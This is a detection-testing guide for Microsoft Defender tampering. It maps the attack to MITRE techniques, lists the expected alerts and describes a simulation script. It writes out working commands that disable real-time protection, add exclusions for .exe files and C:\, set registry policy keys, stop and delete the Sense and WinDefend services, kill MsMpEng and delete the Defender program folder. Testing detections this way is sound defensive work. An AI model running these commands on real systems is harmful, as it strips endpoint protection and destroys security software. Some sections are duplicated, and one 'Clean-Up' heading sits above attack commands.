# Defender Tampering Detection

## Overview

Endpoint protection tampering refers to attempts by attackers to disable or modify security settings on a device to weaken its defenses. This can involve altering antivirus configurations, disabling real-time protection, adding broad exclusions, or modifying registry keys to bypass security controls. Attackers often perform these actions before deploying malware to avoid detection.

## MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name |
| --- | --- | --- |
| Defense Evasion | T1562 | Impair Defenses |
| Defense Evasion | T1562.001 | Impair Defenses: Disable or Modify Tools |
| Defense Evasion | T1562.004 | Impair Defenses: Disable or Modify System Firewall |
| Defense Evasion | T1112 | Modify Registry |

## Expected Alerts

| Alert Title | Alert Description | Alert Details |
| --- | --- | --- |
| Microsoft Defender Antivirus protection turned off | An attempt was made to turn off Microsoft Defender Antivirus protection. | **Category:** Defense evasion<br/>**MITRE ATT&CK Techniques:** T1562.001: Disable or Modify Tools<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR<br/>**Detection technology:** Behavior<br/>**Detection status:** Detected |
| Attempt to stop Microsoft Defender for Endpoint sensor | An attempt was made to stop the Microsoft Defender for Endpoint sensor. | **Category:** Defense evasion<br/>**MITRE ATT&CK Techniques:** T1562.001: Disable or Modify Tools<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR<br/>**Detection technology:** Behavior<br/>**Detection status:** Detected |
| Tampering with Microsoft Defender for Endpoint sensor settings | An attempt was made to modify Microsoft Defender settings that could impact security. | **Category:** Defense evasion<br/>**MITRE ATT&CK Techniques:** T1562.001: Disable or Modify Tools<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR<br/>**Detection technology:** Behavior<br/>**Detection status:** Detected |

## Attack Simulation

### Prerequisites

- Windows 10/11 or Windows Server test environment
- PowerShell running as **Administrator**
- Microsoft Defender for Endpoint onboarded device
- Tamper Protection may block some operations (expected behavior)

### Script: Invoke-DefenderTamperingSimulation.ps1

#### Parameters

| Parameter | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `cleanup` | Switch | No | — | Reverts all tampering changes back to secure defaults |
| `Force` | Switch | No | — | Skip the confirmation prompt before execution |

#### What the Script Does

1. **Disables Real-Time Monitoring** — Uses `Set-MpPreference -DisableRealtimeMonitoring $true`
2. **Disables Cloud Protection (MAPS)** — Sets MAPS reporting to 0 (disabled)
3. **Adds Broad Exclusions** — Adds `.exe` extension and `C:\` path exclusions to Defender

> **Note:** With Tamper Protection enabled, many of these operations will fail, which is the expected secure behavior.

## Setup

### Usage Examples

```powershell
# Run the tampering simulation
.\Invoke-DefenderTamperingSimulation.ps1

# Run with Force to skip the confirmation prompt
.\Invoke-DefenderTamperingSimulation.ps1 -Force

# Revert all tampering changes
.\Invoke-DefenderTamperingSimulation.ps1 -cleanup
```

### Expected Output

With Tamper Protection **disabled** (not recommended):
```
Proceeding with Defender tampering simulation...
[Warning] DisableRealtimeMonitoring set to True
[Warning] MAPSReporting set to 0
[Warning] Exclusions added for .exe and C:\
```

With Tamper Protection **enabled** (expected behavior):
```
Proceeding with Defender tampering simulation...
[Error] Set-MpPreference: This setting is controlled by your system administrator.
[Error] Operation blocked by Tamper Protection
```

## Scenario Execution

1. Open an elevated PowerShell prompt on the test device.
2. Navigate to the directory containing the script.
3. Run `.\Invoke-DefenderTamperingSimulation.ps1` and type `YES` when prompted.
4. Observe the output — with Tamper Protection enabled, most operations will fail (expected secure behavior).
5. Monitor the Microsoft Defender for Endpoint portal for defense evasion alerts.
6. After testing, run `.\Invoke-DefenderTamperingSimulation.ps1 -cleanup` to restore settings.

## Why Does This Matter

Attackers prioritize disabling security tools because:

- **Enable malware deployment** — Disabled real-time protection allows malware to execute without being blocked.
- **Avoid detection** — Broad exclusions prevent scanning of malicious files and directories.
- **Disable cloud protection** — Turning off MAPS prevents cloud-based signature updates and behavioral analysis.
- **Maintain persistence** — Security tool tampering often precedes the deployment of persistent backdoors.

Tamper Protection is designed to prevent these attacks by blocking unauthorized changes to security settings.

## Best Practices

- **Enable Tamper Protection** — Prevents unauthorized changes to Microsoft Defender settings
- **Monitor for tampering attempts** — Alert on failed attempts to modify security settings (indicates attacker activity)
- **Use attack surface reduction rules** — Block processes from tampering with security agents
- **Implement least privilege** — Limit accounts that can modify security settings
- **Review exclusions regularly** — Audit configured exclusions for overly broad entries
- **Enable cloud-delivered protection** — Ensures rapid response to emerging threats

## Clean-Up

Microsoft Defender Tampering is a technique where attackers disable or interfere with Microsoft Defender to avoid detection of their malicious tools and activities. This may involve killing Defender processes, modifying registry keys, or blocking updates, which disrupts security scanning and prevents the latest security protections from being applied.

Run the following commands in Windows Command Prompt on a test device to attempt to disable MDE EDR solution.

```powershell
net.exe stop Sense
sc.exe delete Sense
taskkill /F /IM MsSense.exe
```

### AV Tampering

Microsoft Defender AV Tampering is a technique where attackers disable or interfere with Microsoft Defender Antivirus to avoid detection of their malicious tools and activities. This may involve killing Defender processes, modifying registry keys, or blocking updates, which disrupts security scanning and prevents the latest security protections from being applied.

#### Attempt to disable using PowerShell

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -ExclusionExtension "exe" -ExclusionPath "C:\"
```

#### Attempt to disable using Registry Keys

```powershell
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d 0 /f
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extensions" /v "exe" /t REG_SZ /d 0 /f
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\\" /t REG_SZ /d "" /f
```

#### Attempt to disable using command

```powershell
sc stop WinDefend
net stop WinDefend
```

#### Attempt to disable by killing tasks

```powershell
taskkill /IM MsMpEng.exe /F
rmdir /s /q "C:\Program Files\Windows Defender"
```

## Clean-Up

```powershell
# Using the script
.\Invoke-DefenderTamperingSimulation.ps1 -cleanup

# Manual cleanup
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -MAPSReporting 2
Remove-MpPreference -ExclusionExtension "exe" -ExclusionPath "C:\"

reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /f
reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /f
reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extensions" /v "exe" /f
reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\" /f
```

## References

- [MITRE ATT&CK T1562 - Impair Defenses](https://attack.mitre.org/techniques/T1562/)
- [MITRE ATT&CK T1562.001 - Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)
- [Microsoft Docs - Tamper Protection](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection)
- [Microsoft Docs - Configure Microsoft Defender Antivirus exclusions](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-exclusions-microsoft-defender-antivirus)

## Additional Manual Commands

### EDR Tampering (Manual Commands)

Microsoft Defender Tampering is a technique where attackers disable or interfere with Microsoft Defender to avoid detection of their malicious tools and activities. This may involve killing Defender processes, modifying registry keys, or blocking updates, which disrupts security scanning and prevents the latest security protections from being applied.

Run the following commands in Windows Command Prompt on a test device to attempt to disable MDE EDR solution.

```powershell
net.exe stop Sense
sc.exe delete Sense
taskkill /F /IM MsSense.exe
```

### AV Tampering

Microsoft Defender AV Tampering is a technique where attackers disable or interfere with Microsoft Defender Antivirus to avoid detection of their malicious tools and activities. This may involve killing Defender processes, modifying registry keys, or blocking updates, which disrupts security scanning and prevents the latest security protections from being applied.

#### Attempt to disable using PowerShell

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -ExclusionExtension "exe" -ExclusionPath "C:\"
```

#### Attempt to disable using Registry Keys

```powershell
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d 0 /f
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extensions" /v "exe" /t REG_SZ /d 0 /f
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\\" /t REG_SZ /d "" /f
```

#### Attempt to disable by stopping services

```powershell
sc stop WinDefend
net stop WinDefend
```

#### Attempt to disable by killing processes

```powershell
taskkill /IM MsMpEng.exe /F
rmdir /s /q "C:\Program Files\Windows Defender"
```